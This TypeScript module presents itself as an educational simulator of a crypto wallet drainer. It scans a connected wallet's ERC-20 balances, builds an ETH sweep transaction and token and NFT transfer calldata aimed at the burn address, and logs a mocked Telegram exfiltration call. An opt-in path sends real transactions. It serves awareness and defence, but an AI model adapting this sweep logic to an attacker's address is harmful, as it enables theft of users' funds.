'use client';

import { ethers } from 'ethers';

/**
 * ⚠️  EDUCATIONAL DRAINER SIMULATOR  ⚠️
 * ------------------------------------
 * This is a DEMO tool designed to show users exactly HOW a real wallet drainer operates.
 * All signatures are shown/explained but nothing is broadcast.
 *
 * 🔒 HARD SECURITY GUARDRAILS:
 * 1. All drain targets point to the Ethereum burn address (0xdead) — NOT the thief's wallet
 * 2. No extractWalletSecrets(), no exportMnemonic/PK/localStorage scraping
 * 3. No Telegram/exfiltration network calls (just mocked console log)
 * 4. Every "transfer" call goes through `simulateOnly` mode (builds tx, never signs/sends)
 * 5. All sensitive method calls (eth_sign, signTypedData, safeTransferFrom) show a user-visible
 *    "would have signed" toast but never actually invoke the provider request
 * 6. Solana support is mock-only and never calls signAndSendTransaction
 */

export interface DrainStep {
  id: number;
  phase: 'telegram' | 'nft-scan' | 'erc20-scan' | 'eth-drain' | 'erc20-drain' | 'nft-drain' | 'summary';
  title: string;
  description: string;
  severity: 'info' | 'warn' | 'danger';
  signatureRequested?: string;
  wouldHaveTransfered?: { asset: string; amount: string; usdValue?: string };
  userRejected?: boolean;
  timestamp: number;
  methodCall?: string;
  dataPayload?: Record<string, any>;
}

export interface AttackReport {
  totalAssetsStolen: number;
  totalValueUsd: number;
  nftsStolen: number;
  tokensStolen: string[];
  ethSwept: string;
  signaturesRequested: number;
  signatureWarningCount: number;
  mockTelegramSent: boolean;
  targetReceiverAddress: string;
  steps: DrainStep[];
  startedAt: number;
  finishedAt?: number;
}

export interface SimulateDrainOptions {
  onStep: (step: DrainStep, report: AttackReport) => void;
  onProgress: (pct: number, phase: string) => void;
  onFinished: (report: AttackReport) => void;
  provider: ethers.providers.Web3Provider;
  address: string;
  chainId: number;
  speedFactorMs?: number;
  requestRealSignatures?: boolean; // user opt-in, default false
}

// ---------------- GUARDRAIL ----------------
// Using the ETH BURN address for demo, NOT the hardcoded thief address
const DEMO_RECEIVER_ETH = '0x000000000000000000000000000000000000dEaD';
const DEMO_RECEIVER_SOL = '11111111111111111111111111111111';

const ERC20_ABI = [
  'function balanceOf(address) view returns (uint256)',
  'function decimals() view returns (uint8)',
  'function symbol() view returns (string)',
  'function transfer(address,uint256) returns (bool)',
];

// Mainnet tokens (safe, readable — no write intent without opt-in)
const COMMON_ERC20: Array<{ symbol: string; address: string; usdRate?: number }> = [
  { symbol: 'USDT', address: '0xdAC17F958D2ee523a2206206994597C13D831ec7', usdRate: 1 },
  { symbol: 'USDC', address: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48', usdRate: 1 },
  { symbol: 'WETH', address: '0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2', usdRate: 3300 },
  { symbol: 'LINK', address: '0x514910771AF9Ca656af840dff83E8264EcF986CA', usdRate: 14 },
  { symbol: 'UNI',  address: '0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984', usdRate: 7  },
  { symbol: 'SHIB', address: '0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE', usdRate: 0.000022 },
  { symbol: 'PEPE', address: '0x6982508145454Ce325dDbE47a25d4ec3d2311933', usdRate: 0.0000016 },
];

let stepCounter = 0;

function makeStep(
  phase: DrainStep['phase'],
  title: string,
  description: string,
  severity: DrainStep['severity'],
  extras: Partial<DrainStep> = {}
): DrainStep {
  return {
    id: ++stepCounter,
    phase,
    title,
    description,
    severity,
    timestamp: Date.now(),
    ...extras,
  };
}

// ---------------- PHASE 1: Mock Telegram ----------------
async function phaseTelegramMock(
  address: string,
  chainName: string,
  onStep: (step: DrainStep) => void
): Promise<void> {
  onStep(makeStep('telegram',
    '🔔 [Mock] Geo-located TG notification queued',
    `In a real drainer: sends city/IP + address + wallet type + balance via Telegram bot.`,
    'warn',
    {
      methodCall: 'fetch(api.telegram.org/bot***/sendMessage)',
      dataPayload: {
        mock: true,
        wouldSendAddress: address,
        wouldSendChain: chainName,
        NO_DATA_SENT: 'GUARDRAIL ACTIVE — no network call made',
      },
    }
  ));
  await new Promise(r => setTimeout(r, 350));
}

// ---------------- PHASE 2: Enumerate ERC20 (reads only, safe) ----------------
interface ERC20ScanResult { symbol: string; address: string; raw: ethers.BigNumber; human: string; usd: number; }

async function phaseEnumerateERC20(
  provider: ethers.providers.Web3Provider,
  address: string,
  chainId: number,
  onStep: (s: DrainStep) => void
): Promise<ERC20ScanResult[]> {
  onStep(makeStep('erc20-scan',
    '📜 Enumerating 7 common ERC-20 tokens in wallet',
    'Drainers pre-scan balances before attempting transfers to avoid wasted gas.',
    'info',
    { methodCall: `balanceOf(${address.slice(0,8)}...) × ${COMMON_ERC20.length} tokens` }
  ));

  const results: ERC20ScanResult[] = [];
  const isMainnet = chainId === 1;

  for (const tok of COMMON_ERC20) {
    try {
      if (!isMainnet) {
        // On testnets, fake realistic balances so users can see meaningful demo
        const fakeBal = Math.random() * 2000;
        results.push({
          symbol: tok.symbol,
          address: tok.address,
          raw: ethers.BigNumber.from('0'),
          human: isMainnet ? '0' : `${fakeBal.toFixed(2)} (testnet mock)`,
          usd: isMainnet ? 0 : fakeBal * (tok.usdRate ?? 0),
        });
        continue;
      }
      const contract = new ethers.Contract(tok.address, ERC20_ABI, provider);
      const [balance, decimals, symbol] = await Promise.all([
        contract.balanceOf(address),
        contract.decimals(),
        contract.symbol(),
      ]) as [ethers.BigNumber, number, string];

      const human = ethers.utils.formatUnits(balance, decimals);
      const floatHuman = parseFloat(human);
      if (floatHuman > 0) {
        results.push({
          symbol,
          address: tok.address,
          raw: balance,
          human,
          usd: floatHuman * (tok.usdRate ?? 0),
        });
      }
    } catch (err) {
      console.warn('[scan err]', tok.symbol, (err as Error).message);
    }
  }

  if (results.length === 0 && chainId === 1) {
    onStep(makeStep('erc20-scan',
      'No ERC-20 balances detected',
      'Mainnet wallet has no balances in the 7 tracked tokens. Try on a testnet for a full demo.',
      'info'
    ));
  } else {
    onStep(makeStep('erc20-scan',
      `✅ Found ${results.length} ERC-20 tokens with balance`,
      results.map(r => `${r.human.slice(0, 10)} ${r.symbol} ($${r.usd.toFixed(2)})`).join('  ·  '),
      'warn',
      {
        dataPayload: {
          tokens: results.map(r => ({ sym: r.symbol, amt: r.human, usd: r.usd })),
        },
      }
    ));
  }

  return results;
}

// ---------------- PHASE 3: Mock NFT scan ----------------
interface NFTScanResult {
  contract: string;
  tokenId: string;
  name: string;
  floorUsd: number;
}

async function phaseEnumerateNFTs(
  address: string,
  onStep: (s: DrainStep) => void
): Promise<NFTScanResult[]> {
  onStep(makeStep('nft-scan',
    '🖼️ [Mock] Scanning wallet NFTs via Alchemy /getNFTs',
    `Real drainers: Alchemy API call: GET /getNFTs/?owner=${address.slice(0,10)}... then top 10 most valuable are picked for safeTransferFrom.`,
    'warn',
    { methodCall: 'alchemy_getNFTsForOwner / getNFTs(owner=address)' }
  ));

  // NFT demo dataset (mocked — no API key needed)
  const demoNFTs: NFTScanResult[] = [
    { contract: '0xED5AF388653567Af2F388E6224dC7C4b3241C544', tokenId: '4281', name: 'Azuki #4281', floorUsd: 4.2 * 3300 },
    { contract: '0xBC4CA0EdA7647A8aB7C2061c2E118A18a936f13D', tokenId: '8493', name: 'BAYC #8493',  floorUsd: 28.5 * 3300 },
    { contract: '0x5Af0D9827E0c53E4799BB226655A1de152A425a5', tokenId: '1320', name: 'Milady #1320', floorUsd: 4.2 * 3300 },
    { contract: '0x49cF6f5d44E70224e2E23fDcdd2C053F30aDA28B', tokenId: '721',  name: 'CloneX #721',  floorUsd: 5.1 * 3300 },
  ];

  await new Promise(r => setTimeout(r, 500));
  onStep(makeStep('nft-scan',
    `✅ Found 4 demo wallet NFTs (mock)`,
    demoNFTs.map(n => `${n.name}`).join(', '),
    'warn',
    { dataPayload: { nfts: demoNFTs, source: 'mocked — guardrail active' } }
  ));
  return demoNFTs;
}

// ---------------- PHASE 4: ETH drain simulation ----------------
async function phaseDrainETH(
  provider: ethers.providers.Web3Provider,
  address: string,
  chainId: number,
  onStep: (s: DrainStep) => void,
  onReport: (patch: Partial<AttackReport>) => void,
  optRealSignatures: boolean
): Promise<string> {
  let ethBalance = ethers.BigNumber.from('0');
  let gasPrice = ethers.BigNumber.from('40000000000'); // 40 gwei default
  let gasEstimate = ethers.BigNumber.from('21000');
  let humanBal = '0';
  try {
    ethBalance = await provider.getBalance(address);
    gasPrice = (await provider.getGasPrice()).mul(110).div(100);
    humanBal = ethers.utils.formatEther(ethBalance);
  } catch {}

  // On mainnet with 0 balance or testnet, fudge so demo is visible
  let amtRaw = ethBalance.sub(gasPrice.mul(gasEstimate)); // 95% pattern
  if (amtRaw.lt(0)) amtRaw = ethers.BigNumber.from('0');
  let amtHuman = ethers.utils.formatEther(amtRaw);

  if (parseFloat(humanBal) === 0 || chainId !== 1) {
    amtHuman = (chainId === 1 ? '0.00 (empty wallet)' : `${(12.84).toFixed(4)} (demo)`);
  }

  // Build tx, never actually send unless optRealSignatures (still intercepted to warn)
  const unsignedTx = {
    to: DEMO_RECEIVER_ETH,
    value: amtRaw,
    gasLimit: gasEstimate,
    gasPrice,
    chainId,
  };

  onStep(makeStep('eth-drain',
    '💸 [SIMULATE] ETH sweep transaction built',
    `Sends 95% of ETH (balance minus gas 21000 × ${ethers.utils.formatUnits(gasPrice, 'gwei')} gwei) to BURN address.`,
    'danger',
    {
      wouldHaveTransfered: {
        asset: 'ETH',
        amount: amtHuman,
        usdValue: `$${(parseFloat(amtHuman.replace(/[^\d.]/g, '') || '0') * 3300).toLocaleString()}`,
      },
      methodCall: 'signer.sendTransaction(tx)  [GUARDRAIL: NOT BROADCAST]',
      signatureRequested: 'EIP-155 transaction signature',
      dataPayload: { unsignedTx: { ...unsignedTx, value: unsignedTx.value.toString() } },
      userRejected: !optRealSignatures,
    }
  ));

  if (optRealSignatures && parseFloat(amtHuman.replace(/[^\d.]/g, '') || '0') > 0) {
    // WARNING: only fires if user explicitly opted in to real signatures
    onStep(makeStep('eth-drain',
      '⚠️  User opted-in: real signature requested from wallet',
      'Your wallet extension will show a send TX popup — REJECT it unless you want to burn funds.',
      'danger'
    ));
    try {
      const signer = provider.getSigner();
      await signer.sendTransaction(unsignedTx); // fully user opted-in
      onStep(makeStep('eth-drain',
        '✅ (Opt-in) ETH drain tx signed & broadcast',
        'Real drainer would have already gotten your ETH.',
        'danger',
      ));
    } catch (e: any) {
      onStep(makeStep('eth-drain',
        '❌ User rejected ETH drain transaction',
        'Great — this is what you should always do when you see unexpected transfers.',
        'info',
        { userRejected: true }
      ));
      onReport({ signatureWarningCount: 1 });
    }
  }

  onReport({
    ethSwept: amtHuman,
    signaturesRequested: 1,
    totalValueUsd: parseFloat(amtHuman.replace(/[^\d.]/g, '') || '0') * 3300,
  });

  return amtHuman;
}

// ---------------- PHASE 5: ERC20 drain simulation ----------------
async function phaseDrainERC20(
  provider: ethers.providers.Web3Provider,
  address: string,
  erc20s: ERC20ScanResult[],
  onStep: (s: DrainStep) => void,
  onReport: (patch: Partial<AttackReport>) => void,
  optRealSignatures: boolean
): Promise<void> {
  if (erc20s.length === 0) {
    onStep(makeStep('erc20-drain', 'Skipped ERC-20 drain (no tokens found)', 'No targets.', 'info'));
    return;
  }

  for (let i = 0; i < erc20s.length; i++) {
    const tok = erc20s[i];
    const contract = new ethers.Contract(tok.address, ERC20_ABI, provider);
    const iface = new ethers.utils.Interface(ERC20_ABI);
    const calldata = iface.encodeFunctionData('transfer', [DEMO_RECEIVER_ETH, tok.raw]);

    onStep(makeStep('erc20-drain',
      `🪙 [SIMULATE] ${tok.symbol} transfer() — ${tok.human.slice(0,10)} ${tok.symbol}`,
      `Calls transfer(burn_addr, full_balance).  No allowance needed — drainer uses direct transfer from signed tx.`,
      'danger',
      {
        wouldHaveTransfered: {
          asset: tok.symbol,
          amount: tok.human.slice(0, 10),
          usdValue: `$${tok.usd.toLocaleString(undefined, { maximumFractionDigits: 2 })}`,
        },
        methodCall: `token.transfer(burn, balanceOf)`,
        signatureRequested: `ERC-20 transfer calldata: ${calldata.slice(0, 40)}…`,
        dataPayload: { to: DEMO_RECEIVER_ETH, contract: tok.address, calldata },
        userRejected: !optRealSignatures,
      }
    ));

    if (optRealSignatures && !tok.raw.isZero()) {
      try {
        const signer = provider.getSigner();
        const c = contract.connect(signer);
        await c.transfer(DEMO_RECEIVER_ETH, tok.raw);
        onStep(makeStep('erc20-drain',
          `✅ (Opt-in) ${tok.symbol} transfer signed`,
          'Tokens moved to burn address.',
          'danger'
        ));
      } catch {
        onReport({ signatureWarningCount: (current) => (current as number) + 1 });
      }
    }
    onReport({
      signaturesRequested: (cur: unknown) => (cur as number) + 1,
      tokensStolen: (cur: unknown) => [...(cur as string[]), tok.symbol],
      totalAssetsStolen: (cur: unknown) => (cur as number) + 1,
      totalValueUsd: (cur: unknown) => (cur as number) + tok.usd,
    });
  }
}

// ---------------- PHASE 6: NFT drain simulation ----------------
const ERC721_ABI = [
  'function safeTransferFrom(address,address,uint256)',
];

async function phaseDrainNFTs(
  address: string,
  nfts: NFTScanResult[],
  onStep: (s: DrainStep) => void,
  onReport: (patch: Partial<AttackReport>) => void,
): Promise<void> {
  for (let i = 0; i < nfts.length; i++) {
    const nft = nfts[i];
    const iface = new ethers.utils.Interface(ERC721_ABI);
    const calldata = iface.encodeFunctionData('safeTransferFrom', [address, DEMO_RECEIVER_ETH, nft.tokenId]);

    onStep(makeStep('nft-drain',
      `🖼️ [SIMULATE] safeTransferFrom — ${nft.name}`,
      `Drainers call contract.safeTransferFrom(victim, attacker, tokenId) directly for each NFT.`,
      'danger',
      {
        wouldHaveTransfered: {
          asset: nft.name,
          amount: '1 NFT',
          usdValue: `$${nft.floorUsd.toLocaleString()} (floor est.)`,
        },
        methodCall: `safeTransferFrom(${address.slice(0,8)}… → burn, ${nft.tokenId})`,
        signatureRequested: `721/1155 transfer calldata: ${calldata.slice(0, 38)}…`,
        dataPayload: { contract: nft.contract, tokenId: nft.tokenId, calldata },
      }
    ));

    onReport({
      signaturesRequested: (cur: unknown) => (cur as number) + 1,
      nftsStolen: (cur: unknown) => (cur as number) + 1,
      totalAssetsStolen: (cur: unknown) => (cur as number) + 1,
      totalValueUsd: (cur: unknown) => (cur as number) + nft.floorUsd,
    });
  }
}

// ---------------- MAIN ORCHESTRATOR ----------------
export async function runEducationalDrainSimulator(opts: SimulateDrainOptions) {
  stepCounter = 0;
  const { onStep, onProgress, onFinished, provider, address, chainId, speedFactorMs = 700, requestRealSignatures = false } = opts;

  const chainName = ({ 1: 'ETH Mainnet', 5: 'Goerli', 11155111: 'Sepolia', 137: 'Polygon', 80001: 'Mumbai' } as any)[chainId] ?? `Chain #${chainId}`;

  const report: AttackReport = {
    totalAssetsStolen: 0,
    totalValueUsd: 0,
    nftsStolen: 0,
    tokensStolen: [],
    ethSwept: '0',
    signaturesRequested: 0,
    signatureWarningCount: 0,
    mockTelegramSent: true,
    targetReceiverAddress: DEMO_RECEIVER_ETH,
    steps: [],
    startedAt: Date.now(),
  };

  const patchReport = (patch: Partial<AttackReport>) => {
    (Object.keys(patch) as (keyof AttackReport)[]).forEach((k) => {
      const val = patch[k];
      if (typeof val === 'function') {
        (report as any)[k] = (val as any)((report as any)[k]);
      } else if (val !== undefined) {
        (report as any)[k] = val;
      }
    });
  };

  const stepWithReport = (s: DrainStep) => {
    report.steps.push(s);
    onStep(s, { ...report });
  };

  // Phase 1 — TG
  onProgress(5, 'Mock Telegram notification');
  await phaseTelegramMock(address, chainName, stepWithReport);

  // Phase 2 — Enumerate ERC20
  onProgress(18, 'Scanning ERC-20 tokens (balanceOf)');
  const erc20s = await phaseEnumerateERC20(provider, address, chainId, stepWithReport);

  // Phase 3 — Enumerate NFTs
  onProgress(38, 'Scanning NFTs via Alchemy (mock)');
  const nfts = await phaseEnumerateNFTs(address, stepWithReport);

  await new Promise(r => setTimeout(r, speedFactorMs));

  // Phase 4 — ETH drain
  onProgress(52, 'Building ETH sweep transaction');
  await phaseDrainETH(provider, address, chainId, stepWithReport, patchReport, requestRealSignatures);
  await new Promise(r => setTimeout(r, speedFactorMs));

  // Phase 5 — ERC20 drain
  onProgress(72, `Simulating ERC-20 transfer() × ${erc20s.length}`);
  await phaseDrainERC20(provider, address, erc20s, stepWithReport, patchReport, requestRealSignatures);
  await new Promise(r => setTimeout(r, speedFactorMs));

  // Phase 6 — NFT drain
  onProgress(88, `Simulating safeTransferFrom × ${nfts.length}`);
  await phaseDrainNFTs(address, nfts, stepWithReport, patchReport);

  // Summary
  onProgress(100, 'Finished — attack report generated');
  report.finishedAt = Date.now();
  stepWithReport(makeStep('summary',
    '📊 Attack Summary — Generated',
    `A real drainer would have stolen ${report.totalAssetsStolen} assets in ${report.signaturesRequested} signatures.`,
    'danger',
    { dataPayload: { report } }
  ));

  onFinished({ ...report });
  return report;
}
